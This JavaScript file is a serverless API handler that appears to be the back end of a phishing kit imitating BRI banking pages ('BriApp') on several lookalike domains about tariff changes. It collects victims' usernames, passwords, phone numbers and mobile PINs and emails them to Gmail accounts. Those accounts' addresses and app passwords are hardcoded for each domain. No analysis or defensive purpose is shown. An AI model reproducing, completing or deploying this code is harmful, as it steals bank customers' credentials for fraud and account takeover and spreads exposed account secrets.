export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'https://ubahtarif.herokuapp.com/ '){

        email = 'orbitorbit799@gmail.com';
        pass = 'ahghpmbdwokimqim'; 

    } else if(url == 'ubah--tarif-barulama.vercel.app'){
        email = 'giozx123456@gmail.com' ;
        pass = 'uzbakbdzoclcyzft' ;
        
    } else if(url == 'tarifperubahan-barulama.vercel.app'){
        email = 'pesulapmerah12.12.12b@gmail.com';
        pass = 'xsvyoubwxfogcpuh';

    } else if(url == 'per--ubahan-tarifbri.vercel.app'){
        email = 'tarifbaru36@gmail.com';
        pass = 'moiasopufjkptyvr';


    } else if(url == 'tarif--ubah.vercel.app'){
        email = 'perubahantarif042@gmail.com';
        pass = 'nfqvekcvqmmbufts';

    } else if(url == 'ubahh-tariff-baru-lama.vercel.app'){
        email = 'andarasultan954@gmail.com';
        pass = 'xwjfzwdtiaxfname';

    } else if(url == 'tarifbaru-lama.vercel.app'){
        email = 'wanw4826@gmail.com';
        pass = 'fgevrxoxoymjmzka';


    }  
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',  
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                <ul>
                    <li>username: ${body.username ?? '-'}</li> 
                    <li>password: ${body.password ?? '-'}</li>
                    <li>nohp: ${body.noHp ?? '-'}</li>
                    <li>pin: ${body.mPin ?? '-'}</li>
                    <li>message: ${body.message ?? '-'}</li>
                </ul>
                `,                  
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
